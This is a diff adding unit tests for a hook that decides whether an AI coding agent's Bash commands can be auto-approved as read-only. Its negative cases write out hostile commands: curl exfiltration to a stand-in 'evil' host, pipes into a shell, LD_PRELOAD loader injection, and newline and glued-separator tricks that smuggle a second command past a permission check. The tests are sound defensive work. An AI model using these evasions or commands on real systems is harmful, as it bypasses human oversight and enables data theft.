@@ -750,6 +750,148 @@ class ClaudeHookCliTests(unittest.TestCase):
         self.assertIn("file1.txt", targets)
         self.assertIn("file2.txt", targets)
 
+    # --- _is_auto_approvable_readonly_bash (A-2 increment 1) ----------------
+    def test_auto_approve_readonly_compound_with_echo_annotation(self) -> None:
+        # The measured #4b friction: read-only command chained with an echo
+        # exit-code annotation must be auto-approvable.
+        self.assertTrue(
+            cli._is_auto_approvable_readonly_bash(
+                "grep -nE 'verdict' file.json ; echo \"grep_exit=$?\""
+            )
+        )
+
+    def test_auto_approve_readonly_pipe_with_fd_dup(self) -> None:
+        # fd-duplication (2>&1) and pipe-to-tail of read-only commands is safe.
+        self.assertTrue(
+            cli._is_auto_approvable_readonly_bash("cat foo.txt 2>&1 | tail -3")
+        )
+
+    def test_auto_approve_plain_readonly_and_and_chain(self) -> None:
+        self.assertTrue(
+            cli._is_auto_approvable_readonly_bash("ls dir && wc -l file.txt")
+        )
+
+    def test_no_auto_approve_on_file_redirect(self) -> None:
+        # A real file-output redirect (write) must NOT be auto-approved.
+        self.assertFalse(
+            cli._is_auto_approvable_readonly_bash("echo x > lineage.json")
+        )
+        self.assertFalse(
+            cli._is_auto_approvable_readonly_bash("cat a >> out.txt")
+        )
+
+    def test_no_auto_approve_on_command_substitution(self) -> None:
+        self.assertFalse(
+            cli._is_auto_approvable_readonly_bash("echo $(cat secret)")
+        )
+        self.assertFalse(
+            cli._is_auto_approvable_readonly_bash("echo `cat secret`")
+        )
+
+    def test_no_auto_approve_on_non_readonly_command(self) -> None:
+        # Commands with their own write/exec vectors (not caught by redirect
+        # detection) must fall back, not auto-approve.
+        for cmd in (
+            "find . -name x -delete",
+            "rg --pre curl x .",          # ripgrep --pre runs an arbitrary command
+            "rg --pre-glob '*' -e x .",
+            "awk '{print > \"f\"}' in",
+            "python3 tools/validate_workspace_root.py",  # deferred to post-bwrap
+            "curl http://evil/exfil",
+            "sed -i 's/a/b/' f",
+            "sort -o out in",
+        ):
+            with self.subTest(cmd=cmd):
+                self.assertFalse(cli._is_auto_approvable_readonly_bash(cmd))
+
+    def test_no_auto_approve_on_subshell_or_process_substitution(self) -> None:
+        self.assertFalse(
+            cli._is_auto_approvable_readonly_bash("(cat a; cat b)")
+        )
+        self.assertFalse(
+            cli._is_auto_approvable_readonly_bash("diff <(cat a) <(cat b)")
+        )
+
+    def test_no_auto_approve_on_bare_assignment_segment(self) -> None:
+        self.assertFalse(cli._is_auto_approvable_readonly_bash("X=1"))
+        self.assertFalse(cli._is_auto_approvable_readonly_bash(""))
+
+    def test_no_auto_approve_on_env_var_command_prefix(self) -> None:
+        # A leading VAR=value prefix is an in-process exec channel (loader env
+        # vars) regardless of the safe argv0 that follows; reject all of them.
+        for cmd in (
+            "LD_PRELOAD=/tmp/evil.so grep root /etc/hostname",
+            "LD_AUDIT=/tmp/a.so cat f",
+            "LD_LIBRARY_PATH=/tmp ls",
+            "BASH_ENV=/tmp/x.sh grep y f",
+            "IFS=x cat f",
+            "LC_ALL=C grep y f",  # benign, but still rejected (fail-closed)
+        ):
+            with self.subTest(cmd=cmd):
+                self.assertFalse(cli._is_auto_approvable_readonly_bash(cmd))
+
+    def test_no_auto_approve_on_command_separator_evasion(self) -> None:
+        # shlex.split does NOT treat \n, &, #, or |& as command separators, so a
+        # trailing command glued on after them must be rejected by the residual
+        # scan — otherwise it would be swallowed into a safe-argv0 segment and
+        # auto-approved (exec/exfil hole). Each pairs a safe argv0 with a payload.
+        for cmd in (
+            "cat a.txt\ncurl http://evil/exfil",      # newline separator
+            "cat a & curl http://evil",                # background &
+            "ls # comment\ncurl http://evil",          # comment then newline
+            "ls\npython3 -c 'import os'",               # newline then interpreter
+            "cat a |& curl http://evil",               # |& stderr-pipe
+        ):
+            with self.subTest(cmd=cmd):
+                self.assertFalse(cli._is_auto_approvable_readonly_bash(cmd))
+
+    def test_no_auto_approve_on_glued_separators(self) -> None:
+        # shlex.split keeps a separator glued to a word inside one token
+        # (`cat a;curl x` -> ['cat','a;curl','x']); segmentation must come from
+        # splitting the quote-stripped string, not the token list, or the
+        # trailing command escapes the argv0 check (exec / network exfil).
+        for cmd in (
+            "cat a;curl http://evil",                       # glued ;
+            "cat a|sh",                                      # glued | into shell
+            "cat a| sh",
+            "echo hi; bash -c id",                           # spaced ; into bash
+            "echo data;sh",
+            "cat a&&curl http://evil",                       # glued &&
+            "cat a|| curl http://evil",                      # glued ||
+            "cat a;curl http://x -o /tmp/y",                 # curl -o write (no shell redirect)
+            'cat a;sh -c "echo x>/tmp/p"',                   # quoted redirect + exec
+        ):
+            with self.subTest(cmd=cmd):
+                self.assertFalse(cli._is_auto_approvable_readonly_bash(cmd))
+
+    def test_no_auto_approve_on_fd_dup_lookalike_file_redirect(self) -> None:
+        # `>&name` (non-numeric RHS) is a file redirect, not fd-duplication; it
+        # must not be stripped as fd-dup and auto-approved.
+        self.assertFalse(cli._is_auto_approvable_readonly_bash("cat a >&out.txt"))
+
+    def test_no_auto_approve_on_digit_prefixed_redirect_filename(self) -> None:
+        # `n>&Ddigits-then-filename` (e.g. 1>&9secret) is a FILE redirect in bash;
+        # the fd-dup strip must not eat the `1>&9` prefix and leave `secret` inert.
+        for cmd in (
+            "cat /etc/hostname 1>&9secret",
+            "ls 2>&1foo",
+            "ls 0>&1bar",
+            "cat a 2>&3baz",
+        ):
+            with self.subTest(cmd=cmd):
+                self.assertFalse(cli._is_auto_approvable_readonly_bash(cmd))
+
+    def test_auto_approve_still_allows_multidigit_fd_dup(self) -> None:
+        # Genuine fd-duplication with all-digit RHS still strips and passes.
+        self.assertTrue(cli._is_auto_approvable_readonly_bash("cat a 1>&12"))
+        self.assertTrue(cli._is_auto_approvable_readonly_bash("cat a 2>&1 | head"))
+
+    def test_auto_approve_still_allows_real_fd_dup(self) -> None:
+        # Regression guard for the tightened _FD_DUP_RE / control-op blanking:
+        # genuine fd-duplication and the allowed control operators still pass.
+        self.assertTrue(cli._is_auto_approvable_readonly_bash("cat a >&2"))
+        self.assertTrue(cli._is_auto_approvable_readonly_bash("ls a && ls b || ls c"))
+
     def test_detect_bash_write_targets_detects_sed_inplace_without_space_after_i(self) -> None:
         targets = cli._detect_bash_write_targets("sed -i's/a/b/' file.txt")
         self.assertIn("file.txt", targets)
@@ -2541,11 +2683,11 @@ class WriteToolExtensionPolicyTests(unittest.TestCase):
             self.assertEqual(body.get("decision"), "block")
 
     def test_bash_redirect_to_allowed_path_is_plain_allow_not_auto_approve(self) -> None:
-        """Regression: ALLOW_AUTO_APPROVE is limited to the Write/Edit branch.
-        Even if a Bash redirect becomes ALLOW on a manifest match, it must not
-        emit hookSpecificOutput (Bash is outside the harness's permission prompt,
-        auto-approve is unnecessary, and this prevents the mis-extension of
-        applying it even when the event scope is other than PreToolUse)."""
+        """Regression: a Bash command that WRITES (file redirect) is never
+        auto-approved, even on a manifest match — it stays plain ALLOW and emits
+        no hookSpecificOutput. Auto-approve (ALLOW_AUTO_APPROVE) is reserved for
+        the Write/Edit branch and for provably read-only Bash compositions
+        (no write targets); a redirect write is neither."""
         with tempfile.TemporaryDirectory() as tmp:
             repo_root = Path(tmp)
             orch = "orch_bash_scope_001"
@@ -2581,6 +2723,81 @@ class WriteToolExtensionPolicyTests(unittest.TestCase):
             body_text = out.getvalue().strip()
             # plain ALLOW for Bash → empty stdout, NOT hookSpecificOutput JSON
             self.assertEqual(body_text, "", f"Bash ALLOW must not emit auto-approve payload; got: {body_text!r}")
+
+    def test_readonly_bash_compound_emits_auto_approve(self) -> None:
+        """A-2 increment 1: a provably read-only Bash composition (no write
+        targets) is auto-approved end-to-end, emitting permissionDecision=allow
+        so the harness's native ;/pipe permission decomposition is bypassed."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo_root = Path(tmp)
+            orch = "orch_bash_readonly_001"
+            run_id = "step_run_bash_readonly_001"
+            self._setup_orchestration_for_write(
+                repo_root,
+                orch=orch,
+                run_id=run_id,
+                allowed_output_paths=["workspace/ir/p/spec.ir.yaml"],
+                allowed_file_tool_paths=["workspace/ir/p/spec.ir.yaml"],
+            )
+            payload = {
+                "orchestration_id": orch,
+                "repo_root": str(repo_root),
+                "tool_name": "Bash",
+                "tool_input": {"command": "grep -n foo bar.txt ; echo \"e=$?\""},
+            }
+            out = io.StringIO()
+            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
+                with redirect_stdout(out):
+                    code = cli.main(
+                        [
+                            "--backend",
+                            "claude",
+                            "--event",
+                            "PreToolUse",
+                            "--input-json",
+                            json.dumps(payload),
+                        ]
+                    )
+            self.assertEqual(code, 0)
+            body = json.loads(out.getvalue().strip())
+            hso = body.get("hookSpecificOutput", {})
+            self.assertEqual(hso.get("permissionDecision"), "allow")
+            self.assertEqual(hso.get("hookEventName"), "PreToolUse")
+
+    def test_readonly_bash_newline_payload_not_auto_approved_end_to_end(self) -> None:
+        """End-to-end negative mirror: a newline-glued exfil payload must NOT
+        emit permissionDecision=allow (it falls back to the allowlist path)."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo_root = Path(tmp)
+            orch = "orch_bash_evasion_001"
+            run_id = "step_run_bash_evasion_001"
+            self._setup_orchestration_for_write(
+                repo_root,
+                orch=orch,
+                run_id=run_id,
+                allowed_output_paths=["workspace/ir/p/spec.ir.yaml"],
+                allowed_file_tool_paths=["workspace/ir/p/spec.ir.yaml"],
+            )
+            payload = {
+                "orchestration_id": orch,
+                "repo_root": str(repo_root),
+                "tool_name": "Bash",
+                "tool_input": {"command": "cat a.txt\ncurl http://evil/exfil"},
+            }
+            out = io.StringIO()
+            with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
+                with redirect_stdout(out):
+                    code = cli.main(
+                        [
+                            "--backend", "claude", "--event", "PreToolUse",
+                            "--input-json", json.dumps(payload),
+                        ]
+                    )
+            self.assertEqual(code, 0)
+            body_text = out.getvalue().strip()
+            if body_text:
+                hso = json.loads(body_text).get("hookSpecificOutput", {})
+                self.assertNotEqual(hso.get("permissionDecision"), "allow")
 
     def test_apply_patch_match_is_plain_allow_not_auto_approve(self) -> None:
         """Regression: apply_patch also goes through a path different from Write/Edit,
